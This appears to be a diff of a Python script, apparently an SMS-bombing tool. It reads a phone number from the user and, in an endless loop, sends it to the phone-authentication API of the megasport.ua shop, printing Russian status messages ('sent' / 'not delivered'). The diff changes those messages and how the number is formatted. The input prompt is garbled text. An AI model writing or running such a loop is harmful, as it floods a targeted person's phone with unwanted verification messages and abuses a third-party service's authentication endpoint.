@@ -8,8 +8,8 @@ NUMBER = input('Beeante HOMep tenedona: (6es +)')
 
 while True:
  try:
-     print('json+')
-     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone': "+" + NUMBER})
+     print('Отправлено')
+     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone' :  NUMBER})
  except:
-     print('Json+')
+     print('Не доставлено')
      time.sleep(5000)
